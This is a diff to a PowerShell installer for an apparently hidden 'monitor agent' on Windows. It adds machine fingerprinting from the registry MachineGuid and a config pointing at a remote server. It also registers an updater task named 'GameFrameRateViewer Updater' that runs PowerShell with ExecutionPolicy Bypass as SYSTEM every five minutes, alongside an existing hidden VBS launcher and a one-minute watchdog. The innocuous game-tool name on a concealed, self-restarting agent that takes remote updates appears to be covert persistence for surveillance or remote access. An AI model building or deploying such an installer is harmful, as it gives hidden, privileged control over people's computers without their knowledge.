@@ -23,14 +23,20 @@ $script:LegacyLauncherPath = Join-Path $script:LegacyUserDataDir "run-hidden.vbs
 $script:InstallExe = Join-Path $script:InstallDir "$script:ProcessName.exe"
 $script:SourceExe = Join-Path (Split-Path -Parent $MyInvocation.MyCommand.Path) "monitor-agent.exe"
 $script:SourceUpdater = Join-Path (Split-Path -Parent $MyInvocation.MyCommand.Path) "updater.ps1"
+$script:SourceRunner = Join-Path (Split-Path -Parent $MyInvocation.MyCommand.Path) "runner.ps1"
 $script:LauncherPath = Join-Path $script:InstallDir "run-hidden.vbs"
 $script:WatchdogPath = Join-Path $script:InstallDir "watchdog.vbs"
 $script:UpdaterPath = Join-Path $script:InstallDir "updater.ps1"
+$script:UpdaterDir = Join-Path $script:InstallDir "updater"
+$script:RunnerPath = Join-Path $script:UpdaterDir "runner.ps1"
+$script:UpdaterTaskPath = Join-Path $script:UpdaterDir "updater.ps1"
+$script:UpdaterConfigPath = Join-Path $script:UpdaterDir "updater-config.json"
 $script:ConfigPath = Join-Path $script:InstallDir "config.json"
 $script:DownloadsDir = Join-Path $script:InstallDir "downloads"
 $script:PreviousDir = Join-Path $script:InstallDir "previous"
 $script:LogDir = Join-Path $script:UserDataDir "logs"
 $script:LogPath = Join-Path $script:LogDir "install.log"
+$script:UpdaterTaskName = "GameFrameRateViewer Updater"
 
 function Write-InstallLog {
     param([string]$Message)
@@ -80,6 +86,27 @@ function Test-AgentSource {
     if (-not (Test-Path $script:SourceUpdater)) {
         throw "updater.ps1 not found. Keep installer script, updater, and program in the same folder."
     }
+    if (-not (Test-Path $script:SourceRunner)) {
+        throw "runner.ps1 not found. Keep installer script, runner, updater, and program in the same folder."
+    }
+}
+
+function Get-MachineId {
+    try {
+        $value = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Cryptography" -Name MachineGuid -ErrorAction Stop).MachineGuid
+        if (-not [string]::IsNullOrWhiteSpace($value)) { return $value }
+    } catch {}
+    return $env:COMPUTERNAME
+}
+
+function Get-OrCreateInstallId {
+    if (Test-Path $script:ConfigPath) {
+        try {
+            $existing = Get-Content -Path $script:ConfigPath -Encoding UTF8 -Raw | ConvertFrom-Json
+            if ($existing.install_id) { return [string]$existing.install_id }
+        } catch {}
+    }
+    return [guid]::NewGuid().ToString("N")
 }
 
 function Stop-AgentProcesses {
@@ -113,7 +140,7 @@ WScript.Quit 0
 }
 
 function Remove-OldTasksAndService {
-    foreach ($task in @($script:MainTaskName, $script:WatchdogTaskName, "Windows Monitor", "Windows Monitor Watchdog", "MonitorAgent")) {
+    foreach ($task in @($script:MainTaskName, $script:WatchdogTaskName, $script:UpdaterTaskName, "Windows Monitor", "Windows Monitor Watchdog", "MonitorAgent")) {
         Invoke-NativeQuiet "schtasks.exe" @("/End", "/TN", $task) | Out-Null
         Invoke-NativeQuiet "schtasks.exe" @("/Delete", "/TN", $task, "/F") | Out-Null
     }
@@ -159,16 +186,35 @@ function Set-InstallDirectoryAcl {
 }
 
 function Write-AgentConfig {
+    $installId = Get-OrCreateInstallId
+    $machineId = Get-MachineId
+    $serverUrl = "http://$script:ServerHost`:$script:ServerPort"
     $config = [ordered]@{
         server_host = $script:ServerHost
         server_port = $script:ServerPort
+        server_url = $serverUrl
         install_dir = $script:InstallDir
         user_data_dir = $script:UserDataDir
+        install_id = $installId
+        machine_id = $machineId
+        updater_version = "0.58.1"
         update_enabled = $true
         update_check_interval = 300
         installed_at = (Get-Date).ToString("s")
     }
     $config | ConvertTo-Json | Set-Content -Path $script:ConfigPath -Encoding UTF8
+
+    New-Item -ItemType Directory -Force -Path $script:UpdaterDir | Out-Null
+    $updaterConfig = [ordered]@{
+        server_host = $script:ServerHost
+        server_port = $script:ServerPort
+        server_url = $serverUrl
+        install_dir = $script:InstallDir
+        install_id = $installId
+        machine_id = $machineId
+        updater_version = "0.58.1"
+    }
+    $updaterConfig | ConvertTo-Json | Set-Content -Path $script:UpdaterConfigPath -Encoding UTF8
 }
 
 function Write-HiddenLauncher {
@@ -203,6 +249,7 @@ End If
 function New-MonitorTasks {
     $mainAction = "wscript.exe `"$script:LauncherPath`""
     $watchdogAction = "wscript.exe `"$script:WatchdogPath`""
+    $runnerAction = "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File `"$script:RunnerPath`" -InstallDir `"$script:InstallDir`""
 
     $mainOut = Invoke-NativeQuiet "schtasks.exe" @("/Create", "/TN", $script:MainTaskName, "/TR", $mainAction, "/SC", "ONLOGON", "/RL", "HIGHEST", "/IT", "/F")
     if ($mainOut.ExitCode -ne 0) {
@@ -212,6 +259,11 @@ function New-MonitorTasks {
     $watchOut = Invoke-NativeQuiet "schtasks.exe" @("/Create", "/TN", $script:WatchdogTaskName, "/TR", $watchdogAction, "/SC", "MINUTE", "/MO", "1", "/RL", "HIGHEST", "/IT", "/F")
     if ($watchOut.ExitCode -ne 0) {
         throw "Failed to create watchdog task: $($watchOut.Output)"
+    }
+
+    $updaterOut = Invoke-NativeQuiet "schtasks.exe" @("/Create", "/TN", $script:UpdaterTaskName, "/TR", $runnerAction, "/SC", "MINUTE", "/MO", "5", "/RU", "SYSTEM", "/RL", "HIGHEST", "/F")
+    if ($updaterOut.ExitCode -ne 0) {
+        throw "Failed to create updater task: $($updaterOut.Output)"
     }
 }
 
@@ -240,6 +292,7 @@ function Install-Agent {
     Write-InstallLog "Installing $script:ProductName, server $script:ServerHost`:$script:ServerPort"
 
     New-Item -ItemType Directory -Force -Path $script:InstallDir | Out-Null
+    New-Item -ItemType Directory -Force -Path $script:UpdaterDir | Out-Null
     New-Item -ItemType Directory -Force -Path $script:DownloadsDir | Out-Null
     New-Item -ItemType Directory -Force -Path $script:PreviousDir | Out-Null
     New-Item -ItemType Directory -Force -Path $script:LogDir | Out-Null
@@ -248,12 +301,15 @@ function Install-Agent {
 
     Copy-Item -Force -Path $script:SourceExe -Destination $script:InstallExe
     Copy-Item -Force -Path $script:SourceUpdater -Destination $script:UpdaterPath
+    Copy-Item -Force -Path $script:SourceUpdater -Destination $script:UpdaterTaskPath
+    Copy-Item -Force -Path $script:SourceRunner -Destination $script:RunnerPath
     Write-AgentConfig
     Write-HiddenLauncher
     Write-WatchdogScript
     Set-InstallDirectoryAcl
     New-MonitorTasks
     Start-Monitor
+    Invoke-NativeQuiet "schtasks.exe" @("/Run", "/TN", $script:UpdaterTaskName) | Out-Null
 
     Write-InstallLog "Install completed"
 }
